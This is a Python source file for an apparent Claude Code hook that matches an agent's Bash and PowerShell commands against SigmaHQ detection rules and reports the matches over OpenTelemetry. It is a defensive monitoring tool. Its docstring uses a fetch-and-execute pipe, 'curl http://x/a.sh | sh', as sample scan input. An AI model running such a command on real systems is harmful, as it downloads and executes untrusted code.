"""Claude Code PreToolUse hook: match Bash and PowerShell commands against Sigma rules.

Reads the hook JSON from stdin, evaluates the command against the SigmaHQ rules
compiled into rules.json (see build_rules.py), and sends a `sigma_scan` record plus
one `sigma_match` record per matched rule to the OpenTelemetry collector over
OTLP/HTTP. Report only: it never prints a decision and always exits 0.

Standard library only, so it runs with any Python 3.9+.

Manual use:
    python sigma_hook.py --scan "curl http://x/a.sh | sh" [--tool PowerShell]
prints the matches as JSON and sends nothing.
"""
import json
import os
import re
import sqlite3
import sys
import time
import urllib.request
from pathlib import Path

RULES_FILE = Path(__file__).with_name("rules.json")
ENDPOINT = os.environ.get("SIGMA_HOOK_OTLP_ENDPOINT", "http://localhost:4318/v1/logs")
SERVICE_NAME = "claude-code-sigma"
SHELL_TOOLS = {"Bash", "PowerShell"}
MAX_ATTR_LEN = 8192
LEVEL_RANK = {"informational": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
SEVERITY = {"medium": (13, "WARN"), "high": (17, "ERROR"), "critical": (21, "FATAL")}

# Words that run the next word as the actual program
PREFIX_WORDS = {"sudo", "env", "exec", "nohup", "time", "command", "builtin", "nice", "&", "."}
ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
OPERATORS = ("&&", "||", "|", ";")
HEREDOC = re.compile(r"(?<!<)<<(-?)\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2")


def skip_heredocs(command, i, line):
    """At the newline ending `line`, return the index after any heredoc bodies it opened."""
    for dash, _, delimiter in HEREDOC.findall(line):
        while i < len(command):
            end = command.find("\n", i)
            end = len(command) if end == -1 else end
            line = command[i:end]
            i = end + 1
            if (line.lstrip("\t") if dash else line) == delimiter:
                break
    return i


def split_segments(command):
    """Split a command line on && || | ; and newlines, respecting quotes.

    Heredoc bodies are data, not commands, so they are left out of the segments.
    """
    segments, current, quote, i, line_start = [], [], None, 0, 0
    while i < len(command):
        ch = command[i]
        if ch == "\n" and not quote and current and current[-1] == "\\":
            current.pop()  # line continuation
            i += 1
            continue
        if ch == "\n" and not quote:
            line = command[line_start:i]
            segments.append("".join(current))
            current = []
            i = skip_heredocs(command, i + 1, line) if HEREDOC.search(line) else i + 1
            line_start = i
            continue
        if quote:
            current.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < len(command):
                current.append(command[i + 1])
                i += 1
            elif ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch
            current.append(ch)
        elif ch == "\\" and i + 1 < len(command) and command[i + 1] != "\n":
            current.extend(command[i:i + 2])
            i += 1
        else:
            op = next((o for o in OPERATORS if command.startswith(o, i)), None)
            if op:
                segments.append("".join(current))
                current = []
                i += len(op)
                continue
            current.append(ch)
        i += 1
    segments.append("".join(current))
    return [s.strip() for s in segments if s.strip() and not s.strip().startswith("#")]


def tokens(segment):
    """Shell words with quotes removed (good enough for finding the first program)."""
    words = re.findall(r"(?:[^\s\"']+|\"[^\"]*\"|'[^']*')+", segment)
    return [w.replace('"', "").replace("'", "") for w in words]


def program_of(segment):
    """First real program word of one segment: skips VAR=value and sudo/env/..."""
    for word in tokens(segment):
        if not (ASSIGNMENT.match(word) or word.lower() in PREFIX_WORDS):
            return word
    return ""


def windows_path(path, cwd):
    """Absolute Windows path for a Git Bash (/c/x), forward-slash or relative path."""
    path = re.sub(r"^/([A-Za-z])/", lambda m: m.group(1).upper() + ":/", path).replace("/", "\\")
    if re.match(r"^[A-Za-z]:\\|^\\\\", path):
        return path
    base = windows_path(cwd, "C:\\") if cwd else "C:"
    return base.rstrip("\\") + "\\" + re.sub(r"^(\.\\)+", "", path)


def image_for(program, product, cwd=None):
    """Build Image and OriginalFileName in the shape Sigma rules expect for this product."""
    if not program:
        return None, None
    base = re.split(r"[\\/]", program)[-1]
    if product == "windows":
        exe = base if re.search(r"\.(exe|com|bat|cmd|ps1)$", base, re.I) else base + ".exe"
        if re.search(r"[\\/]", program):
            directory = windows_path(program, cwd).rsplit("\\", 1)[0]
            return directory + "\\" + exe, exe
        return "C:\\Windows\\System32\\" + exe, exe
    image = program if "/" in program else "/usr/bin/" + base
    return image, None


def build_rows(command, tool, cwd=None):
    """One row per (log source, segment), plus one row for the whole command line.

    The whole-command row catches rules that look for the pipe itself (base64 | bash).
    For PowerShell it is the real powershell.exe process; for Bash it has no Image, since
    a made-up bash.exe row trips rules about bash.exe launched without -c.
    """
    segments = split_segments(command)
    products = ("windows",) if tool == "PowerShell" else ("linux", "macos", "windows")
    rows = []
    for product in products:
        if tool == "PowerShell":
            rows.append(("process_creation", product,
                         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                         "PowerShell.EXE", command, None))
        else:
            rows.append(("process_creation", product, None, None, command, None))
        for segment in segments:
            image, original = image_for(program_of(segment), product, cwd)
            if image:
                rows.append(("process_creation", product, image, original, segment, None))
    if tool == "PowerShell":
        rows.append(("ps_script", "windows", None, None, None, command))
    return rows, len(segments)


def regexp(pattern, value):
    if value is None:
        return False
    try:
        return re.search(pattern, value) is not None
    except re.error:
        return False


class Matcher:
    def __init__(self, rules_file=RULES_FILE):
        data = json.loads(rules_file.read_text(encoding="utf-8"))
        self.version = data["sigma_release"]
        self.rules = data["rules"]
        self.fields = data["fields"]

    def scan(self, command, tool, cwd=None):
        rows, segment_count = build_rows(command, tool, cwd)
        db = sqlite3.connect(":memory:")
        db.create_function("REGEXP", 2, regexp, deterministic=True)
        columns = ", ".join(f'"{f}" TEXT COLLATE NOCASE' for f in self.fields)
        db.execute(f"CREATE TABLE logs (_category TEXT, _product TEXT, {columns})")
        db.executemany(
            'INSERT INTO logs (_category, _product, "Image", "OriginalFileName", "CommandLine", '
            '"ScriptBlockText") VALUES (?, ?, ?, ?, ?, ?)', rows)
        matches = []
        for rule in self.rules:
            sql = (f"SELECT COALESCE(\"CommandLine\", \"ScriptBlockText\") FROM logs "
                   f"WHERE _category = ? AND _product = ? AND ({rule['sql']}) LIMIT 1")
            try:
                hit = db.execute(sql, (rule["category"], rule["product"])).fetchone()
            except sqlite3.Error:
                continue
            if hit:
                matches.append((rule, hit[0]))
        db.close()
        return matches, segment_count


def attr(key, value):
    if isinstance(value, bool):
        return {"key": key, "value": {"boolValue": value}}
    if isinstance(value, int):
        return {"key": key, "value": {"intValue": str(value)}}
    return {"key": key, "value": {"stringValue": str(value)[:MAX_ATTR_LEN]}}


def record(event, attributes, level=None, now_ns=None):
    number, text = SEVERITY.get(level, (9, "INFO"))
    ts = str(now_ns or time.time_ns())
    return {
        "timeUnixNano": ts,
        "observedTimeUnixNano": ts,
        "severityNumber": number,
        "severityText": text,
        "body": {"stringValue": event},
        "attributes": [attr("event.name", event)] + [attr(k, v) for k, v in attributes.items()
                                                    if v not in (None, "")],
    }


def build_payload(hook, matches, segment_count, duration_ms, version):
    tool_input = hook.get("tool_input") or {}
    common = {
        "session.id": hook.get("session_id"),
        "prompt.id": hook.get("prompt_id"),
        "tool_use_id": hook.get("tool_use_id"),
        "tool_name": hook.get("tool_name"),
        "command": tool_input.get("command", ""),
        "cwd": hook.get("cwd"),
        "permission_mode": hook.get("permission_mode"),
        "rules_version": version,
    }
    levels = [m[0]["level"] for m in matches]
    max_level = max(levels, key=LEVEL_RANK.get) if levels else ""
    records = [record("sigma_scan", {**common, "segment_count": segment_count,
                                     "match_count": len(matches), "max_level": max_level,
                                     "duration_ms": duration_ms}, max_level or None)]
    for rule, segment in matches:
        techniques = [t.split(".", 1)[1].upper() for t in rule["tags"]
                      if re.match(r"attack\.t\d{4}", t)]
        tactics = [t.split(".", 1)[1] for t in rule["tags"]
                   if t.startswith("attack.") and not re.match(r"attack\.[tgs]\d{4}", t)]
        records.append(record("sigma_match", {
            **common,
            "rule.id": rule["id"],
            "rule.title": rule["title"],
            "rule.level": rule["level"],
            "rule.status": rule["status"],
            "rule.author": rule["author"],
            "rule.category": f"{rule['category']}/{rule['product']}",
            "rule.reference": (rule["references"] or [""])[0],
            "rule.falsepositives": "; ".join(rule["falsepositives"]),
            "mitre.techniques": ",".join(techniques),
            "mitre.tactics": ",".join(tactics),
            "matched_segment": segment,
        }, rule["level"]))
    return {"resourceLogs": [{
        "resource": {"attributes": [attr("service.name", SERVICE_NAME)]},
        "scopeLogs": [{"scope": {"name": "sigma_hook", "version": version},
                       "logRecords": records}],
    }]}


def send(payload):
    request = urllib.request.Request(ENDPOINT, data=json.dumps(payload).encode("utf-8"),
                                     headers={"Content-Type": "application/json"})
    urllib.request.urlopen(request, timeout=2).read()


def run_hook(stdin):
    hook = json.loads(stdin)
    if hook.get("tool_name") not in SHELL_TOOLS:
        return
    command = (hook.get("tool_input") or {}).get("command") or ""
    if not command.strip():
        return
    matcher = Matcher()
    start = time.perf_counter()
    matches, segment_count = matcher.scan(command, hook["tool_name"], hook.get("cwd"))
    duration_ms = round((time.perf_counter() - start) * 1000)
    send(build_payload(hook, matches, segment_count, duration_ms, matcher.version))


def report_error(exc, stdin):
    print(f"sigma_hook: {exc!r}", file=sys.stderr)
    try:
        hook = json.loads(stdin) if stdin else {}
        send({"resourceLogs": [{
            "resource": {"attributes": [attr("service.name", SERVICE_NAME)]},
            "scopeLogs": [{"scope": {"name": "sigma_hook"}, "logRecords": [record(
                "sigma_hook_error", {"error": repr(exc), "tool_use_id": hook.get("tool_use_id"),
                                     "session.id": hook.get("session_id")}, "high")]}],
        }]})
    except Exception:
        pass


def main(argv):
    if len(argv) > 2 and argv[1] == "--scan":
        tool = argv[argv.index("--tool") + 1] if "--tool" in argv else "Bash"
        matches, _ = Matcher().scan(argv[2], tool, os.getcwd())
        print(json.dumps([{"level": r["level"], "title": r["title"], "id": r["id"],
                           "segment": s} for r, s in matches], indent=2))
        return 0
    stdin = sys.stdin.read()
    try:
        run_hook(stdin)
    except Exception as exc:
        report_error(exc, stdin)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
